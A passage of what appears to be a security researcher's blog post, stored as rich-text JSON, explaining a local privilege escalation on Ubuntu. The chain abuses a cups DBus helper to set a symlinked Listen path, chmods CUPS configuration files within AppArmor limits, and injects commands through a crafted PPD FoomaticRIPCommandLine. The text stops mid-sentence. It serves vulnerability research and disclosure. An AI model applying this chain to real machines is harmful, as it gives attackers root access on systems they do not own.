6","hideLineNumbers":false,"startingLineNumber":1,"snippet":"unlink(\"/var/run/cups/cups.sock\")       = -1 ENOENT (No such file or directory)\numask(000)                              = 022\nbind(8\u003cUNIX-STREAM:[120796]\u003e, {sa_family=AF_UNIX, sun_path=\"/var/run/cups/cups.sock\"}, 26) = 0\numask(022)                              = 000\nchmod(\"/var/run/cups/cups.sock\", 0140777) = 0"}}},"content":[]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"We know from when we validated our previous assumptions against the ","marks":[],"data":{}},{"nodeType":"text","value":"cupsd","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" configuration file that ","marks":[],"data":{}},{"nodeType":"text","value":"/var/run/cups/cups.sock","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" is defined as a “Listen” argument. So, we can potentially control the value used in these syscalls here. My initial reaction is that there is a race condition here. The ","marks":[],"data":{}},{"nodeType":"text","value":"chmod","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" call does not happen against a file descriptor, so there is a small window between the bind call and the ","marks":[],"data":{}},{"nodeType":"text","value":"chmod","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" call where the socket could be swapped out for a symbolic link, allowing for arbitrary ","marks":[],"data":{}},{"nodeType":"text","value":"chmod","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":". A ","marks":[],"data":{}},{"nodeType":"text","value":"chmod","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" of 0140777 (essentially the same as ","marks":[],"data":{}},{"nodeType":"text","value":"chmod 777","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":") will set the target of the call to be readable and writable by all users on the system. Since the ","marks":[],"data":{}},{"nodeType":"text","value":"cupsd","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" process runs as root, this is potentially a very useful exploitation gadget, as we could (for example) set ","marks":[],"data":{}},{"nodeType":"text","value":"/etc/passwd","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" to be world-writable and change our user id to 0, effectively making us root!","marks":[],"data":{}}]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"If we look up this specific functionality in cups we can see the following snippet from ","marks":[],"data":{}},{"nodeType":"text","value":"cups/cups/http-addr.c","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":":","marks":[],"data":{}}]},{"nodeType":"embedded-entry-block","data":{"target":{"metadata":{"tags":[],"concepts":[]},"sys":{"space":{"sys":{"type":"Link","linkType":"Space","id":"oyrbri43adzz"}},"id":"61YrjXf03x1HK3k5N9URxX","type":"Entry","createdAt":"2024-09-09T17:53:58.040Z","updatedAt":"2024-09-09T17:53:58.040Z","environment":{"sys":{"id":"master","type":"Link","linkType":"Environment"}},"publishedVersion":3,"revision":1,"contentType":{"sys":{"type":"Link","linkType":"ContentType","id":"contentCodeBlockSnippets"}},"locale":"en-US"},"fields":{"internalName":"\"Abusing Ubuntu\" - Code block 7","hideLineNumbers":false,"startingLineNumber":1,"snippet":"    // Remove any existing domain socket file...\n    unlink(addr-\u003eun.sun_path);\n\n    // Save the current umask and set it to 0 so that all users can access\n    // the domain socket...\n    mask = umask(0);\n\n    // Bind the domain socket...\n    status = bind(fd, (struct sockaddr *)addr, (socklen_t)httpAddrLength(addr));\n\n    // Restore the umask and fix permissions...\n    umask(mask);\n    chmod(addr-\u003eun.sun_path, 0140777);"}}},"content":[]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"Notice that the return values to neither unlink nor bind are checked until ","marks":[],"data":{}},{"nodeType":"text","value":"after","marks":[{"type":"italic"}],"data":{}},{"nodeType":"text","value":" the ","marks":[],"data":{}},{"nodeType":"text","value":"chmod","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" call is executed (omitted, ","marks":[],"data":{}},{"nodeType":"text","value":"status","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" is checked later). The ","marks":[],"data":{}},{"nodeType":"text","value":"bind","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" system call doesn’t like symlinks, so if there is one present at the provided path, the bind will fail. My assumption, based on previous experience and the ","marks":[],"data":{}},{"nodeType":"text","value":"strace","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" output, was that the bind call return value would be checked, and if there was a symlink present, ","marks":[],"data":{}},{"nodeType":"text","value":"cupsd","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" would quit with an error. But this was not the case in the code, so we could have our malicious symlink in place well before the call to bind and still get to the chmod call. This changes our initial assumption of a race condition into a vulnerability caused by not checking return values.","marks":[],"data":{}}]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"Eagle-eyed readers may also question the call to unlink and ask why that wouldn’t still make this a race condition. Whilst this may look like a major hurdle (and a return of the race condition), we will see shortly why this is not the case.","marks":[],"data":{}}]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"So, where are we now? We have found a method on the DBus interface which allows us to set arguments in the ","marks":[],"data":{}},{"nodeType":"text","value":"cupsd.conf","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" configuration file, cups is then restarted and our configuration should take effect. We’ve also found some potentially unsafe handling of the Listen argument. We know that this is not a race condition.","marks":[],"data":{}}]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"So we can call our identified method, set Listen to a symlink to something interesting, and have write access to whatever we like now? To test this, we’ll create a new directory in ","marks":[],"data":{}},{"nodeType":"text","value":"/tmp","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":", and add a symlink to ","marks":[],"data":{}},{"nodeType":"text","value":"/etc/passwd","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" as our sample target. We can then call the DBus method and set Listen to this path (","marks":[],"data":{}},{"nodeType":"text","value":"/tmp/stage/passwd","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":"). Unfortunately, this does not work:","marks":[],"data":{}}]},{"nodeType":"embedded-entry-block","data":{"target":{"metadata":{"tags":[],"concepts":[]},"sys":{"space":{"sys":{"type":"Link","linkType":"Space","id":"oyrbri43adzz"}},"id":"3NJhn38uFK49iyMJddNw1y","type":"Entry","createdAt":"2024-09-09T17:53:58.105Z","updatedAt":"2024-09-09T17:53:58.105Z","environment":{"sys":{"id":"master","type":"Link","linkType":"Environment"}},"publishedVersion":3,"revision":1,"contentType":{"sys":{"type":"Link","linkType":"ContentType","id":"contentCodeBlockSnippets"}},"locale":"en-US"},"fields":{"internalName":"\"Abusing Ubuntu\" - Code block 8","hideLineNumbers":false,"startingLineNumber":1,"snippet":"unlink(\"/tmp/stage/passwd\")             = -1 EACCES (Permission denied)\numask(000)                              = 022\nbind(6\u003cUNIX-STREAM:[125588]\u003e, {sa_family=AF_UNIX, sun_path=\"/tmp/stage/passwd\"}, 20) = -1 EADDRINUSE (Address already in use)\numask(022)                              = 000\nchmod(\"/tmp/stage/passwd\", 0140777)     = -1 EACCES (Permission denied)"}}},"content":[]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"This is unexpected. ","marks":[],"data":{}},{"nodeType":"text","value":"cupsd","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" is running as root, and it even has ","marks":[],"data":{}},{"nodeType":"text","value":"CAP_DAC_OVERRIDE","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":". Why can’t we remove a file (the ","marks":[],"data":{}},{"nodeType":"text","value":"unlink","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" system call) owned by a normal user, let alone run ","marks":[],"data":{}},{"nodeType":"text","value":"chmod","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" for our own file? (","marks":[],"data":{}},{"nodeType":"text","value":"/etc/passwd","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" is owned by root)","marks":[],"data":{}}]},{"nodeType":"heading-2","data":{},"content":[{"nodeType":"text","value":"Linux AppArmor","marks":[],"data":{}}]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"The answer lies in AppArmor.","marks":[],"data":{}}]},{"nodeType":"heading-3","data":{},"content":[{"nodeType":"text","value":"What is AppArmor","marks":[],"data":{}}]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"AppArmor is a Linux kernel security module that can restrict contained programs to only a specific set of resources. Similar to SELinux, AppArmor can be used to define profiles which an application will be executed with, and this profile specifies an allow and deny list of resources which the application can interact with.","marks":[],"data":{}}]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"A profile looks something like the following excerpt, taken from the ","marks":[],"data":{}},{"nodeType":"text","value":"tcpdump","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" profile on my Ubuntu test machine:","marks":[],"data":{}}]},{"nodeType":"embedded-entry-block","data":{"target":{"metadata":{"tags":[],"concepts":[]},"sys":{"space":{"sys":{"type":"Link","linkType":"Space","id":"oyrbri43adzz"}},"id":"7irQLOydh57Uig6WcArcAb","type":"Entry","createdAt":"2024-09-09T17:53:58.122Z","updatedAt":"2024-09-09T17:53:58.122Z","environment":{"sys":{"id":"master","type":"Link","linkType":"Environment"}},"publishedVersion":4,"revision":1,"contentType":{"sys":{"type":"Link","linkType":"ContentType","id":"contentCodeBlockSnippets"}},"locale":"en-US"},"fields":{"internalName":"\"Abusing Ubuntu\" - Code block 9","hideLineNumbers":false,"startingLineNumber":1,"snippet":"profile tcpdump /usr/bin/tcpdump {\n[...]\n  # for -z\n  /{usr/,}bin/gzip ixr,\n  /{usr/,}bin/bzip2 ixr,\n\n  # for -F and -w\n  audit deny @{HOME}/.* mrwkl,\n  audit deny @{HOME}/.*/ rw,\n  audit deny @{HOME}/.*/** mrwkl,\n  audit deny @{HOME}/bin/ rw,\n  audit deny @{HOME}/bin/** mrwkl,\n  owner @{HOME}/ r,\n  owner @{HOME}/** rw,\n\n  # for -r, -F and -w\n  /**.[pP][cC][aA][pP] rw,\n  /**.[pP][cC][aA][pP][nN][gG] rw,\n  /**.[cC][aA][pP] rw,\n[...]\n}"}}},"content":[]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"This profile will restrict what files any ","marks":[],"data":{}},{"nodeType":"text","value":"tcpdump","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" process can access. For example, we can see that it is only allowed to execute (the ","marks":[],"data":{}},{"nodeType":"text","value":"ixr","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" flag) a certain list of binaries (","marks":[],"data":{}},{"nodeType":"text","value":"gzip","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":", ","marks":[],"data":{}},{"nodeType":"text","value":"bzip2","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":"). We can also see that it is not allowed to access hidden files and directories in any user’s home directory but is explicitly allowed to write to directories owned by the user under which ","marks":[],"data":{}},{"nodeType":"text","value":"tcpdump","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" is executing. Finally, we can see that the process is only allowed to write files outside of the home directory if the file extension is ","marks":[],"data":{}},{"nodeType":"text","value":".pcap","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" or similar. We can see this in action in the following snippet. Observe that, even though ","marks":[],"data":{}},{"nodeType":"text","value":"/dev/shm","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" is world writable, ","marks":[],"data":{}},{"nodeType":"text","value":"tcpdump","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" cannot write to this directory unless the file extension ends with a ","marks":[],"data":{}},{"nodeType":"text","value":"pcap","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" extension.","marks":[],"data":{}}]},{"nodeType":"embedded-entry-block","data":{"target":{"metadata":{"tags":[],"concepts":[]},"sys":{"space":{"sys":{"type":"Link","linkType":"Space","id":"oyrbri43adzz"}},"id":"5BwbXpQubzueOFCUfwosSX","type":"Entry","createdAt":"2024-09-09T17:53:58.139Z","updatedAt":"2024-09-09T17:53:58.139Z","environment":{"sys":{"id":"master","type":"Link","linkType":"Environment"}},"publishedVersion":3,"revision":1,"contentType":{"sys":{"type":"Link","linkType":"ContentType","id":"contentCodeBlockSnippets"}},"locale":"en-US"},"fields":{"internalName":"\"Abusing Ubuntu\" - Code block 10","hideLineNumbers":false,"startingLineNumber":1,"snippet":"$ ls -ld /dev/shm\ndrwxrwxrwt 2 root root 40 May 10 13:59 /dev/shm\n$ sudo tcpdump -i lo -w /dev/shm/test\ntcpdump: /dev/shm/test: Permission denied\n$ sudo tcpdump -i lo -w /dev/shm/test.pcap\ntcpdump: listening on lo, link-type EN10MB (Ethernet), snapshot length 262144 bytes"}}},"content":[]},{"nodeType":"heading-3","data":{},"content":[{"nodeType":"text","value":"Linux AppArmor, savior, and saboteur","marks":[],"data":{}}]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"Now that we’ve had a quick introduction to AppArmor, how does it apply to our cups vulnerability? We can see in ","marks":[],"data":{}},{"nodeType":"text","value":"/etc/apparmor.d/usr.sbin.cupsd","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" that ","marks":[],"data":{}},{"nodeType":"text","value":"cupsd","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" has its own profile.","marks":[],"data":{}}]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"There are two parts that we can attribute to the behavior of the strace output we observed earlier. Firstly, we can see that the policy imports ","marks":[],"data":{}},{"nodeType":"text","value":"abstractions/user-tmp","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":". The abstractions folder contains a number of partial policies which are generic and can be reused. In this file, we can see the following snippet:","marks":[],"data":{}}]},{"nodeType":"embedded-entry-block","data":{"target":{"metadata":{"tags":[],"concepts":[]},"sys":{"space":{"sys":{"type":"Link","linkType":"Space","id":"oyrbri43adzz"}},"id":"2TyPNjrHz27tQuPJSyrqXY","type":"Entry","createdAt":"2024-09-09T17:53:58.156Z","updatedAt":"2024-09-09T17:53:58.156Z","environment":{"sys":{"id":"master","type":"Link","linkType":"Environment"}},"publishedVersion":4,"revision":1,"contentType":{"sys":{"type":"Link","linkType":"ContentType","id":"contentCodeBlockSnippets"}},"locale":"en-US"},"fields":{"internalName":"\"Abusing Ubuntu\" - Code block 11","hideLineNumbers":false,"startingLineNumber":1,"snippet":"  owner /tmp/**         rwkl,\n  /tmp/                 rw,"}}},"content":[]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"What this policy means is that ","marks":[],"data":{}},{"nodeType":"text","value":"cupsd","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" has read and write access to the directory path at ","marks":[],"data":{}},{"nodeType":"text","value":"/tmp","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" but only has read and write (and ","marks":[],"data":{}},{"nodeType":"text","value":"lock","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" and ","marks":[],"data":{}},{"nodeType":"text","value":"link","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":") access to subdirectories of ","marks":[],"data":{}},{"nodeType":"text","value":"/tmp","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" ","marks":[],"data":{}},{"nodeType":"text","value":"if it is the owner of the subdirectory","marks":[{"type":"italic"}],"data":{}},{"nodeType":"text","value":". Since our testing directory ","marks":[],"data":{}},{"nodeType":"text","value":"/tmp/stage","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" is owned by my user and not root, ","marks":[],"data":{}},{"nodeType":"text","value":"cupsd","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" is not allowed to make changes to this directory — so, the system call to ","marks":[],"data":{}},{"nodeType":"text","value":"unlink","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" fails. This is a very convenient case of a security control actually ","marks":[],"data":{}},{"nodeType":"text","value":"helping","marks":[{"type":"italic"}],"data":{}},{"nodeType":"text","value":" with exploitation, as without this restriction, the code we’ve identified as vulnerable would actually be a race condition as discussed above, but as it stands, because the ","marks":[],"data":{}},{"nodeType":"text","value":"unlink","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" fails, there is no timing element.","marks":[],"data":{}}]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"The second part of the policy impacting our proof of concept is the lack of write access to ","marks":[],"data":{}},{"nodeType":"text","value":"/etc","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":". This is why our ","marks":[],"data":{}},{"nodeType":"text","value":"chmod /etc/passwd","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" attempt (via the symlink) is failing. This makes a lot of sense, because there’s no need for cups to be able to write to ","marks":[],"data":{}},{"nodeType":"text","value":"/etc","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":", so why give it the opportunity?","marks":[],"data":{}}]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"We now have established why our proof of concept has failed. But all is not lost. We can use the AppArmor policy as an instruction manual for things that we know we ","marks":[],"data":{}},{"nodeType":"text","value":"could","marks":[{"type":"italic"}],"data":{}},{"nodeType":"text","value":" successfully chmod and gain write access to. By reading through the policy, we can see that most of the places we have write access to are specific to the cupsd functionality, such as the following snippet, giving us full access to everything under ","marks":[],"data":{}},{"nodeType":"text","value":"/etc/cups","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":".","marks":[],"data":{}}]},{"nodeType":"embedded-entry-block","data":{"target":{"metadata":{"tags":[],"concepts":[]},"sys":{"space":{"sys":{"type":"Link","linkType":"Space","id":"oyrbri43adzz"}},"id":"6FmVMRakEXnsiMzY9a9VPC","type":"Entry","createdAt":"2024-09-09T17:53:58.199Z","updatedAt":"2024-09-09T17:53:58.199Z","environment":{"sys":{"id":"master","type":"Link","linkType":"Environment"}},"publishedVersion":3,"revision":1,"contentType":{"sys":{"type":"Link","linkType":"ContentType","id":"contentCodeBlockSnippets"}},"locale":"en-US"},"fields":{"internalName":"\"Abusing Ubuntu\" - Code block 12","hideLineNumbers":false,"startingLineNumber":1,"snippet":"  /etc/cups/ rw,\n  /etc/cups/** rw,"}}},"content":[]},{"nodeType":"heading-2","data":{},"content":[{"nodeType":"text","value":"Pivot, pivooot","marks":[],"data":{}}]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"We’ve gone from what looked like a very easy-to-exploit vulnerability to something that has quite a limited impact. Looking at the AppArmor policy, we can only really make changes to cups configuration, cache, or log files. We will somehow need to find a method to turn arbitrary control over all of the cups configuration files into something more interesting, our aim being full root command execution.","marks":[],"data":{}}]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"To decide what we can achieve with what we have so far, the first port of call is the documentation for the files we think we can take over. This will include ","marks":[],"data":{}},{"nodeType":"text","value":"cupsd.conf","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":", ","marks":[],"data":{}},{"nodeType":"text","value":"cups-files.conf","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":", and a handful of other files in ","marks":[],"data":{}},{"nodeType":"text","value":"/etc/cups","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":". Reading through the documentation for files we come across two interesting snippets from the ","marks":[],"data":{}},{"nodeType":"hyperlink","data":{"uri":"https://www.cups.org/doc/man-cups-files.conf.html"},"content":[{"nodeType":"text","value":"cups-files.conf","marks":[{"type":"underline"}],"data":{}}]},{"nodeType":"text","value":" man page:","marks":[],"data":{}}]},{"nodeType":"embedded-entry-block","data":{"target":{"metadata":{"tags":[],"concepts":[]},"sys":{"space":{"sys":{"type":"Link","linkType":"Space","id":"oyrbri43adzz"}},"id":"1qBgvcQvDEgvNMpFSSJtOG","type":"Entry","createdAt":"2024-09-09T17:53:58.217Z","updatedAt":"2024-09-09T17:53:58.217Z","environment":{"sys":{"id":"master","type":"Link","linkType":"Environment"}},"publishedVersion":7,"revision":1,"contentType":{"sys":{"type":"Link","linkType":"ContentType","id":"contentCodeBlockSnippets"}},"locale":"en-US"},"fields":{"internalName":"\"Abusing Ubuntu\" - Code block 13","hideLineNumbers":false,"startingLineNumber":1,"snippet":"Group group-name-or-number\n        Specifies the group name or ID that will be used when executing external programs.         The default group is operating system specific but is usually \"lp\" or \"nobody\".\n\nUser username\n        Specifies the user name or ID that is used when running external programs. The       default is \"lp\"."}}},"content":[]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"This sounds very interesting, as it allows for the specification of a user used for external programs. To actually try this out, however, we do need to exploit our vulnerability above to have a successful chmod against ","marks":[],"data":{}},{"nodeType":"text","value":"/etc/cups/cups-files.conf","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":". There is a bit of hidden complexity in exploitation that hasn’t come up yet. When using the DBus ","marks":[],"data":{}},{"nodeType":"text","value":"ServerSetSettings","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" method to change the Listen parameter, cups will no longer run properly. It will successfully execute the ","marks":[],"data":{}},{"nodeType":"text","value":"chmod","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" call as we saw above, but because the bind call is unsuccessful, when the bind return value is checked later in the code cups will identify that the bind failed and exit. In this state, we’re not able to make any more changes, and, critically, we’re not able to exploit the vulnerability again.","marks":[],"data":{}}]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"To mitigate this, we can target ","marks":[],"data":{}},{"nodeType":"text","value":"/etc/cups/cupsd.conf","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" ","marks":[],"data":{}},{"nodeType":"text","value":"first","marks":[{"type":"italic"}],"data":{}},{"nodeType":"text","value":". Our attack will progress, this file will become world writable, and we can fix our inserted malicious Listen lines to be like the original lines — in essence turning our somewhat limited control of this file via DBus into full control. This will allow ","marks":[],"data":{}},{"nodeType":"text","value":"cupsd","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" to successfully start again*, but ","marks":[],"data":{}},{"nodeType":"text","value":"cupsd.conf","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" will remain world writable. Once in this state, we can add more Listen lines to the end of ","marks":[],"data":{}},{"nodeType":"text","value":"cupsd.conf","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" (as ","marks":[],"data":{}},{"nodeType":"text","value":"cupsd","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" will accept multiple of these lines) and trigger a restart of the cupsd service (by using ","marks":[],"data":{}},{"nodeType":"text","value":"ServerSetSettings","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" on an unrelated and safe configuration item). We can now safely re-exploit the vulnerability whenever we like without losing access to ","marks":[],"data":{}},{"nodeType":"text","value":"cupsd","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":", or breaking the ","marks":[],"data":{}},{"nodeType":"text","value":"org.opensuse.CupsPkHelper","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" interface (which requires cups to be functional and listening at an expected location).","marks":[],"data":{}}]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"Using this we can then make ","marks":[],"data":{}},{"nodeType":"text","value":"/etc/cups/cups-files.conf","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" world writable, and now we can add our own ‘User’ and ‘Group’ configuration lines we identified in the configuration documentation.","marks":[],"data":{}}]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"*Starting stopped services is generally a privileged action. However, ","marks":[{"type":"italic"}],"data":{}},{"nodeType":"text","value":"cupsd","marks":[{"type":"italic"},{"type":"code"}],"data":{}},{"nodeType":"text","value":" is a special case because it’s configured to be “socket activated” by default, so by attempting to communicate with ","marks":[{"type":"italic"}],"data":{}},{"nodeType":"text","value":"cupsd","marks":[{"type":"italic"},{"type":"code"}],"data":{}},{"nodeType":"text","value":" where systemd thinks the socket is (our interference notwithstanding), systemd will happily start ","marks":[{"type":"italic"}],"data":{}},{"nodeType":"text","value":"cupsd","marks":[{"type":"italic"},{"type":"code"}],"data":{}},{"nodeType":"text","value":" for us, without the need for any extra privileges.","marks":[{"type":"italic"}],"data":{}}]},{"nodeType":"heading-2","data":{},"content":[{"nodeType":"text","value":"Be who you wanna be","marks":[],"data":{}}]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"We have identified that we can set the User and Group for “external programs”. Naively, we would like to set the ","marks":[],"data":{}},{"nodeType":"text","value":"User","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" and ","marks":[],"data":{}},{"nodeType":"text","value":"Group","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" to root, giving us root access immediately (when we can control “external programs”). However, if we try to set the User/Group lines to this in the configuration file and trigger a restart of cups, we’ll get the following error.","marks":[],"data":{}}]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"From the source code of ","marks":[],"data":{}},{"nodeType":"text","value":"cups/scheduler/conf.c","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":":","marks":[],"data":{}}]},{"nodeType":"embedded-entry-block","data":{"target":{"metadata":{"tags":[],"concepts":[]},"sys":{"space":{"sys":{"type":"Link","linkType":"Space","id":"oyrbri43adzz"}},"id":"4tumyss5ldckbJVvJa8J29","type":"Entry","createdAt":"2024-09-09T17:53:58.235Z","updatedAt":"2024-09-09T17:53:58.235Z","environment":{"sys":{"id":"master","type":"Link","linkType":"Environment"}},"publishedVersion":3,"revision":1,"contentType":{"sys":{"type":"Link","linkType":"ContentType","id":"contentCodeBlockSnippets"}},"locale":"en-US"},"fields":{"internalName":"\"Abusing Ubuntu\" - Code block 14","hideLineNumbers":false,"startingLineNumber":1,"snippet":"\t  if (!p-\u003epw_uid)\n\t  {\n\t    cupsdLogMessage(CUPSD_LOG_ERROR,\n\t                    \"Will not use User %s (UID=0) as specified on line \"\n\t\t\t    \"%d of %s for security reasons.  You must use a \"\n\t\t\t    \"non-privileged account instead.\",\n\t                    value, linenum, CupsFilesFile);\n\t    if (FatalErrors \u0026 CUPSD_FATAL_CONFIG)\n\t      return (0);\n\t  }"}}},"content":[]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"This error tells us that root (or any user with a ","marks":[],"data":{}},{"nodeType":"text","value":"UID","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" of 0) is explicitly disallowed. Since this step does not immediately result in root command execution, we must find another user to target, which can act as a stepping stone to our target of full root.","marks":[],"data":{}}]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"Before we evaluate our attack surface further, we will take a brief moment to discuss “external programs”.","marks":[],"data":{}}]},{"nodeType":"heading-3","data":{},"content":[{"nodeType":"text","value":"Cups external programs","marks":[],"data":{}}]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"Cups is a complex beast — more complex than can be covered in an article of even this length. The following explainer is ","marks":[],"data":{}},{"nodeType":"text","value":"heavily","marks":[{"type":"italic"}],"data":{}},{"nodeType":"text","value":" condensed (and likely overly simplified), mainly to cover the areas we care about. I did not find this technique for this specific chain of vulnerabilities. However, like many things in this post, it was identified by reading documentation.","marks":[],"data":{}}]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"Cups is a printing system for Unix (literally. The name CUPS stands for Common Unix Printing System). You can register printers with cups, defining their capabilities using a PPD (Postscript Printer Description) configuration file. This file describes common things like the paper size, duplex options, resolution, etc. This file can also be used to define the supported filetypes of the printer. There is no use sending a raw PDF file to a printer that cannot understand the format. Therefore this file instructs cups what to do when a specific filetype is printed.","marks":[],"data":{}}]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"Cups distributes a set of “filters”, which can be used to convert between these different standard formats. For example, the ","marks":[],"data":{}},{"nodeType":"text","value":"pdftops","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" filter can convert a ","marks":[],"data":{}},{"nodeType":"text","value":"pdf","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" file to a ","marks":[],"data":{}},{"nodeType":"text","value":"ps","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" (postscript) file, so you can effectively print PDF files on printers that do not understand them by transparently converting them inside cups.","marks":[],"data":{}}]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"One of the filters that a PPD file can specify is “foomatic-rip”, which claims to be a “universal filter”. As part of the configuration for this filter, there is a very juicy option: ","marks":[],"data":{}},{"nodeType":"text","value":"FoomaticRIPCommandLine","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":". Even the naming of this option may pique your interest. This option can be used to define a command line that will be executed when the filter is triggered.","marks":[],"data":{}}]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"I will skip over the tedious validation using strace (","marks":[],"data":{}},{"nodeType":"text","value":"-fe execve","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" is a useful flag if you wish to try this at home) and conclude the following.","marks":[],"data":{}}]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"First we create a PPD file for a fake printer, which contains a ","marks":[],"data":{}},{"nodeType":"text","value":"FoomaticRIPCommandLine","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" item, itself containing a command line controlled by us. We then register a new printer using this PPD file. Helpfully, our previously identified ","marks":[],"data":{}},{"nodeType":"text","value":"org.opensuse.CupsPkHelper","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" DBus interface also includes a method for adding a printer with a manually specified PPD file. With our printer now created, we can attempt to print to it with a sample PDF file. Observing with strace we would see our command line configured in the PPD file executing when the print job is submitted.","marks":[],"data":{}}]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"The end result of this is command injection, and because of our previous exploitation controlling the User and Group parameters for ","marks":[],"data":{}},{"nodeType":"text","value":"exactly these external programs","marks":[{"type":"italic"}],"data":{}},{"nodeType":"text","value":", the programs will run as any User/Group we desire (with the previously discussed exception of 